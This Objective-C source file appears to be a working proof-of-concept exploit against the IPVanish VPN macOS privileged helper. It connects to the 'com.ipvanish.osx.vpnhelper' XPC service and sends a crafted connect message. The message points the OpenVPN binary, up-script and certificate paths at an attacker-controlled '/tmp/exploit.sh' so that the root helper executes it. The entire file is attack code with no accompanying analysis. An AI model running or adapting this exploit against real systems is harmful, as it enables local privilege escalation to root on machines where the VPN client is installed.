#import <Foundation/Foundation.h>
#import <xpc/xpc.h>
#include <unistd.h>
#include <stdlib.h>

#define SERVICE_NAME "com.ipvanish.osx.vpnhelper"

void sendExploitMessage(const char *serviceName) {
    NSLog(@"[DEBUG] Connecting to XPC service: %s", serviceName);

    xpc_connection_t connection = xpc_connection_create_mach_service(serviceName, NULL, 0);
    if (!connection) {
        NSLog(@"[ERROR] Failed to create XPC connection.");
        return;
    }

    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        if (type == XPC_TYPE_DICTIONARY) {
            const char *reply = xpc_dictionary_get_string(event, "reply");
            if (reply) {
                NSLog(@"[DEBUG] Received reply from service: %s", reply);
            }
        } else if (type == XPC_TYPE_ERROR) {
            NSLog(@"[ERROR] XPC service error.");
        }
    });

    xpc_connection_resume(connection);
    NSLog(@"[DEBUG] Connection to XPC service started.");

    NSLog(@"[DEBUG] Creating XPC message (Dictionary)");

    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);

    xpc_dictionary_set_string(message, "VPNHelperCommand", "VPNHelperConnect");
    xpc_dictionary_set_uint64(message, "VPNHelperProtocol", 5);
    xpc_dictionary_set_string(message, "VPNHelperHostname", "192.0.2.1");
    xpc_dictionary_set_string(message, "VPNHelperUsername", "test");
    xpc_dictionary_set_string(message, "VPNHelperPassword", "test");
    xpc_dictionary_set_uint64(message, "VPNHelperPort", 1194);
    xpc_dictionary_set_string(message, "VPNHelperIPAddress", "192.0.2.1");

    xpc_dictionary_set_string(message, "OpenVPNPath",
        "/tmp/exploit.sh");
    xpc_dictionary_set_string(message, "OpenVPNConfigPath", "/tmp/test.ovpn");
    xpc_dictionary_set_string(message, "OpenVPNUpScriptPath",
        "/tmp/exploit.sh");
    xpc_dictionary_set_string(message, "OpenVPNDownScriptPath",
        "/Applications/IPVanish VPN.app/Contents/Frameworks/VPNHelperAdapter.framework/Resources/client-down");
    xpc_dictionary_set_string(message, "OpenVPNCertificatePath",
        "/tmp/exploit.sh");
    xpc_dictionary_set_string(message, "OpenVPNFirewallKSScriptPath",
        "/Applications/IPVanish VPN.app/Contents/Frameworks/VPNHelperAdapter.framework/Resources/firewall-killswitch.scpt");

    xpc_dictionary_set_uint64(message, "OpenVPNPort", 1194);
    xpc_dictionary_set_string(message, "OpenVPNProtocol", "udp");
    xpc_dictionary_set_string(message, "OpenVPNCipher", "AES-256-CBC");

    NSLog(@"[DEBUG] Sending Crafted Message..");

    dispatch_semaphore_t sema = dispatch_semaphore_create(0);

    xpc_connection_send_message_with_reply(connection, message,
        dispatch_get_main_queue(), ^(xpc_object_t reply) {

        NSLog(@"[REPLY] Received XPC reply");

        xpc_type_t type = xpc_get_type(reply);
        if (type == XPC_TYPE_DICTIONARY) {
            char *desc = xpc_copy_description(reply);
            NSLog(@"[REPLY] Dictionary: %s", desc);
            free(desc);

            const char *error = xpc_dictionary_get_string(reply, "XPCErrorDescription");
            if (error) {
                NSLog(@"[REPLY] Error: %s", error);
            } else {
                NSLog(@"[REPLY] Success - No error!");
            }
        } else if (type == XPC_TYPE_ERROR) {
            NSLog(@"[REPLY] XPC Error type");
        } else {
            char *desc = xpc_copy_description(reply);
            NSLog(@"[REPLY] Other type: %s", desc);
            free(desc);
        }

        dispatch_semaphore_signal(sema);
    });

    NSLog(@"[DEBUG] Waiting for reply...");
    dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));

    NSLog(@"[DEBUG] xpc_release(message)");
    xpc_release(message);
    NSLog(@"[DEBUG] xpc_release(connection)");
    xpc_release(connection);
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        [@"client\ndev tun\nproto udp\nremote 192.0.2.1 1194\n"
            writeToFile:@"/tmp/test.ovpn" atomically:YES encoding:NSUTF8StringEncoding error:nil];

        sendExploitMessage(SERVICE_NAME);
    }
    return 0;
}
